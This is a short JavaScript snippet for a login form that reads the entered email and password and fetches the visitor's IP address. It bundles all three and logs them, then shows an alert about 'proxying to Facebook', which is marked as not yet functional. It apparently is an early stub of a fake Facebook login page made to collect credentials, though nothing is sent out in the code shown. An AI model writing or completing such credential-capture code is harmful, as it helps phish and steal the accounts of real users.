// Function to get the user's IP address
function getIpAddress() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(error => {
      console.error('Error fetching IP:', error);
      return 'Unknown';
    });
}

// Form submission handler
document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent the form from refreshing the page
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Get the IP address and log all details
  getIpAddress().then(ip => {
    const loginDetails = { email, password, ip };
    console.log('Login attempt:', loginDetails);
    alert('Proxying to Facebook... (not functional yet) IP: ' + ip);
  });
});